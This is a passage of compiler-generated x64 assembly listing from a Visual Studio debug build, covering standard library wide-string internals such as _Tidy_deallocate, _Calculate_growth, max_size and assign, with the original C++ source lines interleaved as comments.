	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1535 :         return *this;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]

; 1536 :     }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 224
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first, COMDAT

; 1530 :     constexpr _Ty1& _Get_first() noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1531 :         return *this;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]

; 1532 :     }

  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 224
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal, COMDAT

; 4893 :     _CONSTEXPR20 const _Alty& _Getal() const noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4894 :         return _Mypair._Get_first();

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b c8	 mov	 rcx, rax
  00029	e8 00 00 00 00	 call	 ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first

; 4895 :     }

  0002e	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00035	5f		 pop	 rdi
  00036	5d		 pop	 rbp
  00037	c3		 ret	 0
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 224
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal, COMDAT

; 4889 :     _CONSTEXPR20 _Alty& _Getal() noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4890 :         return _Mypair._Get_first();

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b c8	 mov	 rcx, rax
  00029	e8 00 00 00 00	 call	 ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first

; 4891 :     }

  0002e	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00035	5f		 pop	 rdi
  00036	5d		 pop	 rbp
  00037	c3		 ret	 0
?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ
_TEXT	SEGMENT
_My_data$ = 8
_Al$1 = 40
$T2 = 260
this$ = 320
?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate, COMDAT

; 4863 :     _CONSTEXPR20 void _Tidy_deallocate() noexcept { // initialize buffer, deallocating any storage

$LN4:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 48 01
	00 00		 sub	 rsp, 328		; 00000148H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4864 :         auto& _My_data = _Mypair._Myval2;

  0001f	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 89 45 08	 mov	 QWORD PTR _My_data$[rbp], rax

; 4865 :         _My_data._Orphan_all();

  0002a	48 8b 4d 08	 mov	 rcx, QWORD PTR _My_data$[rbp]
  0002e	e8 00 00 00 00	 call	 ?_Orphan_all@_Container_base0@std@@QEAAXXZ ; std::_Container_base0::_Orphan_all

; 4866 :         if (_My_data._Large_mode_engaged()) {

  00033	48 8b 4d 08	 mov	 rcx, QWORD PTR _My_data$[rbp]
  00037	e8 00 00 00 00	 call	 ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
  0003c	0f b6 c0	 movzx	 eax, al
  0003f	85 c0		 test	 eax, eax
  00041	74 34		 je	 SHORT $LN2@Tidy_deall

; 4867 :             _ASAN_STRING_REMOVE(*this);
; 4868 :             auto& _Al = _Getal();

  00043	48 8b 8d 40 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0004a	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  0004f	48 89 45 28	 mov	 QWORD PTR _Al$1[rbp], rax

; 4869 :             _Deallocate_for_capacity(_Al, _My_data._Bx._Ptr, _My_data._Myres);

  00053	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  00057	4c 8b 40 18	 mov	 r8, QWORD PTR [rax+24]
  0005b	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0005f	48 8b 10	 mov	 rdx, QWORD PTR [rax]
  00062	48 8b 4d 28	 mov	 rcx, QWORD PTR _Al$1[rbp]
  00066	e8 00 00 00 00	 call	 ?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity

; 4870 :             _My_data._Bx._Switch_to_buf();

  0006b	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0006f	48 8b c8	 mov	 rcx, rax
  00072	e8 00 00 00 00	 call	 ?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Switch_to_buf
$LN2@Tidy_deall:

; 4871 :         }
; 4872 : 
; 4873 :         _My_data._Mysize = 0;

  00077	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  0007b	48 c7 40 10 00
	00 00 00	 mov	 QWORD PTR [rax+16], 0

; 4874 :         _My_data._Myres  = _Small_string_capacity;

  00083	48 8b 45 08	 mov	 rax, QWORD PTR _My_data$[rbp]
  00087	48 c7 40 18 07
	00 00 00	 mov	 QWORD PTR [rax+24], 7

; 4875 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4876 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  0008f	33 c0		 xor	 eax, eax
  00091	66 89 85 04 01
	00 00		 mov	 WORD PTR $T2[rbp], ax
  00098	b8 02 00 00 00	 mov	 eax, 2
  0009d	48 6b c0 00	 imul	 rax, rax, 0
  000a1	48 8b 4d 08	 mov	 rcx, QWORD PTR _My_data$[rbp]
  000a5	48 03 c8	 add	 rcx, rax
  000a8	48 8b c1	 mov	 rax, rcx
  000ab	48 8d 95 04 01
	00 00		 lea	 rdx, QWORD PTR $T2[rbp]
  000b2	48 8b c8	 mov	 rcx, rax
  000b5	e8 00 00 00 00	 call	 ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ; std::_WChar_traits<wchar_t>::assign

; 4877 :     }

  000ba	48 8d a5 28 01
	00 00		 lea	 rsp, QWORD PTR [rbp+296]
  000c1	5f		 pop	 rdi
  000c2	5d		 pop	 rbp
  000c3	c3		 ret	 0
?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z
_TEXT	SEGMENT
this$ = 224
_Requested$ = 232
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth, COMDAT

; 4773 :     _NODISCARD _CONSTEXPR20 size_type _Calculate_growth(const size_type _Requested) const noexcept {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4774 :         return _Calculate_growth(_Requested, _Mypair._Myval2._Myres, max_size());

  00024	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0002b	e8 00 00 00 00	 call	 ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
  00030	4c 8b c0	 mov	 r8, rax
  00033	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0003a	48 8b 50 18	 mov	 rdx, QWORD PTR [rax+24]
  0003e	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Requested$[rbp]
  00045	e8 00 00 00 00	 call	 ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth

; 4775 :     }

  0004a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00051	5f		 pop	 rdi
  00052	5d		 pop	 rbp
  00053	c3		 ret	 0
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z
_TEXT	SEGMENT
_Masked$ = 8
$T4 = 232
__$ArrayPad$ = 248
_Requested$ = 288
_Old$ = 296
_Max$ = 304
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth, COMDAT

; 4760 :         const size_type _Requested, const size_type _Old, const size_type _Max) noexcept {

$LN5:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec 28 01
	00 00		 sub	 rsp, 296		; 00000128H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00022	b9 12 00 00 00	 mov	 ecx, 18
  00027	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  0002c	f3 ab		 rep stosd
  0002e	48 8b 8c 24 48
	01 00 00	 mov	 rcx, QWORD PTR [rsp+328]
  00036	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0003d	48 33 c5	 xor	 rax, rbp
  00040	48 89 85 f8 00
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  00047	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0004e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4761 :         const size_type _Masked = _Requested | _Alloc_mask;

  00053	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR _Requested$[rbp]
  0005a	48 83 c8 07	 or	 rax, 7
  0005e	48 89 45 08	 mov	 QWORD PTR _Masked$[rbp], rax

; 4762 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

  00062	48 8b 85 30 01
	00 00		 mov	 rax, QWORD PTR _Max$[rbp]
  00069	48 39 45 08	 cmp	 QWORD PTR _Masked$[rbp], rax
  0006d	76 09		 jbe	 SHORT $LN2@Calculate_

; 4763 :             return _Max;

  0006f	48 8b 85 30 01
	00 00		 mov	 rax, QWORD PTR _Max$[rbp]
  00076	eb 68		 jmp	 SHORT $LN1@Calculate_
$LN2@Calculate_:

; 4764 :         }
; 4765 : 
; 4766 :         if (_Old > _Max - _Old / 2) { // similarly, geometric overflows

  00078	33 d2		 xor	 edx, edx
  0007a	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR _Old$[rbp]
  00081	b9 02 00 00 00	 mov	 ecx, 2
  00086	48 f7 f1	 div	 rcx
  00089	48 8b 8d 30 01
	00 00		 mov	 rcx, QWORD PTR _Max$[rbp]
  00090	48 2b c8	 sub	 rcx, rax
  00093	48 8b c1	 mov	 rax, rcx
  00096	48 39 85 28 01
	00 00		 cmp	 QWORD PTR _Old$[rbp], rax
  0009d	76 09		 jbe	 SHORT $LN3@Calculate_

; 4767 :             return _Max;

  0009f	48 8b 85 30 01
	00 00		 mov	 rax, QWORD PTR _Max$[rbp]
  000a6	eb 38		 jmp	 SHORT $LN1@Calculate_
$LN3@Calculate_:

; 4768 :         }
; 4769 : 
; 4770 :         return (_STD max)(_Masked, _Old + _Old / 2);

  000a8	33 d2		 xor	 edx, edx
  000aa	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR _Old$[rbp]
  000b1	b9 02 00 00 00	 mov	 ecx, 2
  000b6	48 f7 f1	 div	 rcx
  000b9	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR _Old$[rbp]
  000c0	48 03 c8	 add	 rcx, rax
  000c3	48 8b c1	 mov	 rax, rcx
  000c6	48 89 85 e8 00
	00 00		 mov	 QWORD PTR $T4[rbp], rax
  000cd	48 8d 95 e8 00
	00 00		 lea	 rdx, QWORD PTR $T4[rbp]
  000d4	48 8d 4d 08	 lea	 rcx, QWORD PTR _Masked$[rbp]
  000d8	e8 00 00 00 00	 call	 ??$max@_K@std@@YAAEB_KAEB_K0@Z ; std::max<unsigned __int64>
  000dd	48 8b 00	 mov	 rax, QWORD PTR [rax]
$LN1@Calculate_:

; 4771 :     }

  000e0	48 8b f8	 mov	 rdi, rax
  000e3	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  000e7	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z$rtcFrameData
  000ee	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  000f3	48 8b c7	 mov	 rax, rdi
  000f6	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  000fd	48 33 cd	 xor	 rcx, rbp
  00100	e8 00 00 00 00	 call	 __security_check_cookie
  00105	48 8d a5 08 01
	00 00		 lea	 rsp, QWORD PTR [rbp+264]
  0010c	5f		 pop	 rdi
  0010d	5d		 pop	 rbp
  0010e	c3		 ret	 0
?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ
_TEXT	SEGMENT
_Alloc_max$ = 8
_Storage_max$ = 40
$T4 = 264
$T5 = 296
$T6 = 328
__$ArrayPad$ = 344
this$ = 384
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size, COMDAT

; 4165 :     _NODISCARD _CONSTEXPR20 size_type max_size() const noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 88 01
	00 00		 sub	 rsp, 392		; 00000188H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  00018	b9 2a 00 00 00	 mov	 ecx, 42			; 0000002aH
  0001d	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00022	f3 ab		 rep stosd
  00024	48 8b 8c 24 a8
	01 00 00	 mov	 rcx, QWORD PTR [rsp+424]
  0002c	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00033	48 33 c5	 xor	 rax, rbp
  00036	48 89 85 58 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  0003d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00044	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 4166 :         const size_type _Alloc_max   = _Alty_traits::max_size(_Getal());

  00049	48 8b 8d 80 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00050	e8 00 00 00 00	 call	 ?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
  00055	48 8b c8	 mov	 rcx, rax
  00058	e8 00 00 00 00	 call	 ?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
  0005d	48 89 45 08	 mov	 QWORD PTR _Alloc_max$[rbp], rax

; 4167 :         const size_type _Storage_max = // can always store small string

  00061	48 c7 85 08 01
	00 00 08 00 00
	00		 mov	 QWORD PTR $T4[rbp], 8
  0006c	48 8d 95 08 01
	00 00		 lea	 rdx, QWORD PTR $T4[rbp]
  00073	48 8d 4d 08	 lea	 rcx, QWORD PTR _Alloc_max$[rbp]
  00077	e8 00 00 00 00	 call	 ??$max@_K@std@@YAAEB_KAEB_K0@Z ; std::max<unsigned __int64>
  0007c	48 8b 00	 mov	 rax, QWORD PTR [rax]
  0007f	48 89 45 28	 mov	 QWORD PTR _Storage_max$[rbp], rax

; 4168 :             (_STD max)(_Alloc_max, static_cast<size_type>(_BUF_SIZE));
; 4169 :         return (_STD min)(static_cast<size_type>((numeric_limits<difference_type>::max)()),

  00083	48 8b 45 28	 mov	 rax, QWORD PTR _Storage_max$[rbp]
  00087	48 ff c8	 dec	 rax
  0008a	48 89 85 28 01
	00 00		 mov	 QWORD PTR $T5[rbp], rax
  00091	e8 00 00 00 00	 call	 ?max@?$numeric_limits@_J@std@@SA_JXZ ; std::numeric_limits<__int64>::max
  00096	48 89 85 48 01
	00 00		 mov	 QWORD PTR $T6[rbp], rax
  0009d	48 8d 95 28 01
	00 00		 lea	 rdx, QWORD PTR $T5[rbp]
  000a4	48 8d 8d 48 01
	00 00		 lea	 rcx, QWORD PTR $T6[rbp]
  000ab	e8 00 00 00 00	 call	 ??$min@_K@std@@YAAEB_KAEB_K0@Z ; std::min<unsigned __int64>
  000b0	48 8b 00	 mov	 rax, QWORD PTR [rax]

; 4170 :             _Storage_max - 1 // -1 is for null terminator and/or npos
; 4171 :         );
; 4172 :     }

  000b3	48 8b f8	 mov	 rdi, rax
  000b6	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  000ba	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ$rtcFrameData
  000c1	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  000c6	48 8b c7	 mov	 rax, rdi
  000c9	48 8b 8d 58 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  000d0	48 33 cd	 xor	 rcx, rbp
  000d3	e8 00 00 00 00	 call	 __security_check_cookie
  000d8	48 8d a5 68 01
	00 00		 lea	 rsp, QWORD PTR [rbp+360]
  000df	5f		 pop	 rdi
  000e0	5d		 pop	 rbp
  000e1	c3		 ret	 0
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z
_TEXT	SEGMENT
_Old_ptr$1 = 8
$T2 = 228
$T3 = 260
this$ = 320
_Ptr$ = 328
_Count$ = 336
?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign, COMDAT

; 3410 :         _In_reads_(_Count) const _Elem* const _Ptr, _CRT_GUARDOVERFLOW const size_type _Count) {

$LN4:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec 48 01
	00 00		 sub	 rsp, 328		; 00000148H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 3411 :         // assign [_Ptr, _Ptr + _Count)
; 3412 :         if (_Count <= _Mypair._Myval2._Myres) {

  00029	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00030	48 8b 40 18	 mov	 rax, QWORD PTR [rax+24]
  00034	48 39 85 50 01
	00 00		 cmp	 QWORD PTR _Count$[rbp], rax
  0003b	77 6c		 ja	 SHORT $LN2@assign

; 3413 :             _ASAN_STRING_REMOVE(*this);
; 3414 :             _Elem* const _Old_ptr   = _Mypair._Myval2._Myptr();

  0003d	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00044	48 8b c8	 mov	 rcx, rax
  00047	e8 00 00 00 00	 call	 ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
  0004c	48 89 45 08	 mov	 QWORD PTR _Old_ptr$1[rbp], rax

; 3415 :             _Mypair._Myval2._Mysize = _Count;

  00050	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00057	48 8b 8d 50 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  0005e	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx

; 3416 :             _Traits::move(_Old_ptr, _Ptr, _Count);

  00062	4c 8b 85 50 01
	00 00		 mov	 r8, QWORD PTR _Count$[rbp]
  00069	48 8b 95 48 01
	00 00		 mov	 rdx, QWORD PTR _Ptr$[rbp]
  00070	48 8b 4d 08	 mov	 rcx, QWORD PTR _Old_ptr$1[rbp]
  00074	e8 00 00 00 00	 call	 ?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::move

; 3417 :             _Traits::assign(_Old_ptr[_Count], _Elem());

  00079	33 c0		 xor	 eax, eax
  0007b	66 89 85 e4 00
	00 00		 mov	 WORD PTR $T2[rbp], ax
  00082	48 8b 45 08	 mov	 rax, QWORD PTR _Old_ptr$1[rbp]
  00086	48 8b 8d 50 01
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
